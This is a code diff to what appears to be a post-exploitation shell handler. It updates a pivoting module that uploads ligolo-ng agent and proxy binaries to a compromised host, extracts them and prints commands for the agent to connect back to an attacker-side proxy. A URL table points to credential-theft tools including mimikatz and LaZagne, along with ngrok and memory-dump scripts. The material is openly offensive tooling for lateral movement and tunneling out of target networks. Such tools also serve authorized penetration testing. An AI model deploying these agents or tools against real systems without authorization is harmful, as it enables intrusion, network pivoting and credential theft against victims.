@@ -4580,25 +4580,48 @@ class ligolo(Module):
 	category = "Pivoting"
 	def run(session, args):
 		"""
-		Setup ligolo-ng agent for advanced tunneling and pivoting
+		Setup ligolo-ng v0.8.2 agent for advanced tunneling and pivoting
+		Usage: run ligolo [proxy|agent] - Default: agent
 		"""
-		if session.OS == 'Unix':
-			url = URLS['ligolo_linux']
-			uploaded_paths = session.upload(url, remote_path=session.tmp)
-			if uploaded_paths:
-				session.exec(f"tar -xzf {uploaded_paths[0]} -C {session.tmp}")
-				agent_path = f"{session.tmp}/agent"
-				session.exec(f"chmod +x {agent_path}")
-				logger.info(f"Ligolo-ng agent extracted to {agent_path}")
-				logger.info("Start with: ./agent -connect <PROXY_IP>:11601 -ignore-cert")
-		elif session.OS == 'Windows':
-			url = URLS['ligolo_windows']
-			uploaded_paths = session.upload(url, remote_path=session.tmp)
-			if uploaded_paths:
-				logger.info(f"Ligolo-ng uploaded to {uploaded_paths[0]}")
-				logger.info("Extract and run: agent.exe -connect <PROXY_IP>:11601 -ignore-cert")
+		mode = args.strip().lower() if args else 'agent'
+
+		if mode == 'proxy':
+			# Download proxy (for running on attacker machine)
+			if session.OS == 'Unix':
+				url = URLS['ligolo_proxy_linux']
+				uploaded_paths = session.upload(url, remote_path=session.tmp)
+				if uploaded_paths:
+					session.exec(f"tar -xzf {uploaded_paths[0]} -C {session.tmp}")
+					proxy_path = f"{session.tmp}/proxy"
+					session.exec(f"chmod +x {proxy_path}")
+					logger.info(f"Ligolo-ng proxy extracted to {proxy_path}")
+					logger.info("Setup TUN interface: sudo ip tuntap add user $(whoami) mode tun ligolo")
+					logger.info("                     sudo ip link set ligolo up")
+					logger.info("Start with: ./proxy -selfcert")
+			else:
+				logger.error("Proxy mode only supported on Unix systems")
+
+		elif mode == 'agent':
+			# Download agent (for running on target machine)
+			if session.OS == 'Unix':
+				url = URLS['ligolo_agent_linux']
+				uploaded_paths = session.upload(url, remote_path=session.tmp)
+				if uploaded_paths:
+					session.exec(f"tar -xzf {uploaded_paths[0]} -C {session.tmp}")
+					agent_path = f"{session.tmp}/agent"
+					session.exec(f"chmod +x {agent_path}")
+					logger.info(f"Ligolo-ng agent v0.8.2 extracted to {agent_path}")
+					logger.info("Start with: ./agent -connect <PROXY_IP>:11601 -ignore-cert")
+			elif session.OS == 'Windows':
+				url = URLS['ligolo_agent_windows']
+				uploaded_paths = session.upload(url, remote_path=session.tmp)
+				if uploaded_paths:
+					logger.info(f"Ligolo-ng agent uploaded to {uploaded_paths[0]}")
+					logger.info("Extract and run: agent.exe -connect <PROXY_IP>:11601 -ignore-cert")
+			else:
+				logger.error("Unsupported OS")
 		else:
-			logger.error("Unsupported OS")
+			logger.error("Invalid mode. Use 'agent' or 'proxy'")
 
 
 class ngrok(Module):
@@ -5393,8 +5416,9 @@ URLS = {
 	'lazagne_linux': "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.py",
 	'lazagne_windows': "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe",
 	'mimikatz':     "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip",
-	'ligolo_linux': "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz",
-	'ligolo_windows': "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.6.2_windows_amd64.zip",
+	'ligolo_agent_linux': "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz",
+	'ligolo_agent_windows': "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip",
+	'ligolo_proxy_linux': "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz",
 	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
 	'uac_linux':  	"https://github.com/tclahr/uac/releases/download/v3.1.0/uac-3.1.0.tar.gz",
 	'linux_procmemdump':  	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
